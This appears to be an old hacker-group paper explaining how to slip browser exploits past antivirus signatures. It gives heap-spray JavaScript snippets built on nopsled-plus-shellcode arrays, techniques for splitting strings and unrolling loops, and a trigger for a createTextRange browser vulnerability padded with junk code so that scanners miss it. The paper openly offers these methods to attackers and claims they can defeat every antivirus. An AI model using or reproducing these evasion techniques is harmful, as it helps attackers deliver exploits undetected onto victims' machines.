Evading AV Signatures...Derailing the Antivirus

Author: "vinnu"
Greetz : Prashant Uniyal, b0nd, Lord Deathstorm, D4rk357, G4H
Team : Legion Of Xtremers (LOX).


The perimeter defence (antivirus) is still considered fullproof measure by most of people
in virtual world. Such an assumption is fatal and can lead to more sophisticated compromise
of systems.

Note: In my last paper, "Heap spray -- Slipping CPU To Our Pocket" I used some example exploits,
and most of people said that these things are getting caught in antivirus. But I already said
that do some R&D and you can develop the neat and clean exploits. So in this paper, I will use
same examples.


Some of the strategies of antivirus and ways to envade them are discussed in this paper.

Strategy: 

1. Hostile code will try to execute itself as-fast-as it can: Bad-bad strategy.

Interesting strategy, as most of the viral code try to execute and infect as-fast-as
it can when it grabs the execution. Such a strategy can be evaded using sleeps, timeouts or dalays.

2. code size, as-small-as-possible: This strategy leads to assumption that a viral code, might employ
smallest possible variable, function names etc. and will lack spaces and tabs.
Again u can evade such an assumption easily by introducing spaces, tabs an breaking longer strings.

Shellcode or any data or string can be disected into several smaller chunks.
For examples:

[IMG]http://www.fb1h2s.com/g4h/JSpayload.jpeg[/IMG]

can Also be transformed into:


[IMG]http://www.fb1h2s.com/g4h/Jspayl2.jpeg[/IMG]



3. Long lasting Loops: essence of exploits: Again bad, bad strategy.

Loops can eat up resources like CPU and task schedular manager whenever sights the presence of any loop, it allocates more CPU time slice to the host process.
This is easiest signature for getting caught. Like this one in heap spray article.


for(i=0;i<1000;i++){spray[i]=nopsled+shellcode;}


This can be broken into smaller loops like:

for(i=0;i<100;i++){spray[i]=nopsled+shellcode;}

for(i=100;i<200;i++){spray[i]=nopsled+shellcode;}

---
---
---

for(i=950;i<1000;i++){spray[i] = nopsled + shellcode; }


But why should you use the loop, if you can do without it like:

var i = 0;
spray[i] = nopsled + shellcode;i++
spray[i] = nopsled + shellcode;i++
spray[i] = nopsled + shellcode;i++
spray[i] = nopsled + shellcode;i++

------
----
thousand lines of such code.

Otherwise:

spray[0] = nopsled + shellcode;
spray[1] = nopsled + shellcode;
spray[2] = nopsled + shellcode;
spray[3] = nopsled + shellcode;
---
---
---
spray[999] = nopsled + shellcode;


The best practice will be:



function somefunc() {
var somevar = document.cookie;
}
var vhold;
spray[0] = nopsled + shellcode;
vhold = setTimeout("somefunc()",50);
spray[1] = nopsled + shellcode;

------
------

and like that.

4. Followup code signature:  This kind of strategy makes antivirus believe that an exploit
will always execute a certain fixed instruction. again bad-bad strategy.

E.g. most antivirus will detect following vulnerability:



<!--------------------->
<input type="checkbox" id='checkid'>
<script type=text/javascript language=javascript>
a=document.getElementById('checkid');
b=a.createTextRange();
</script>
<!--------------------->



But, if we'll insert some junk code into it, then same antivirus, will not detect it as a
threat as in following code:



<!--------------------->
<input type="checkbox" id='checkid'>
<script type=text/javascript language=javascript>
function doit() {
var asdragger = document.cookie + "hi all";
}
a=document.getElementById('checkid');
var grabit = setTimeout("doit()",1000);
var memc = navigator.appVersion;
b=a.createTextRange();
</script>
<!--------------------->


Employing all these techniques, u can also develop a code scrambler and after employing all these techniques
and further scrambling the The antivirus envasion is possible.


There exists more techniques, which if employed including all above listed countermeasures, all the antivirus
with even latest ever updates can also be evaded successfully. Just a little more research from urside is needed.

Thanx..."vinnu"